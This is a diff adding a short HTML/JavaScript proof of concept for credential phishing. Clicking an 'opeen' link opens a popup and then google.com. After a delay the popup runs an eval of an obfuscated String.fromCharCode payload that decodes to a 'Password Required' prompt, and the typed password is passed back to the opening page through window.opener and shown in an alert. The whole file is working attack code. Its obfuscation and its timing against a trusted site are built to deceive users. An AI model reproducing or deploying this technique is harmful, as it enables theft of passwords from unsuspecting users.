@@ -1,0 +1,15 @@
+<a href="javascript:run();" style="font-size: 100px;">opeen</a>
+
+<script>
+	var myWindow;
+	function run(){
+    var script = "setTimeout(function(){ var pass = eval(String.fromCharCode(112,114,111,109,112,116,40,39,80,97,115,115,119,111,114,100,32,82,101,113,117,105,114,101,100,44,39,44,39,39,41,59)); if (pass !== null) { window.opener.save(pass); } window.close(); }, 5000);";
+    myWindow = window.open("javascript:" + script);
+  window.open("https://google.com")
+  }
+	function save(pass){
+		alert("Password " + pass);
+    if (myWindow && !myWindow.closed) myWindow.close();
+		window.close();
+	}
+</script>
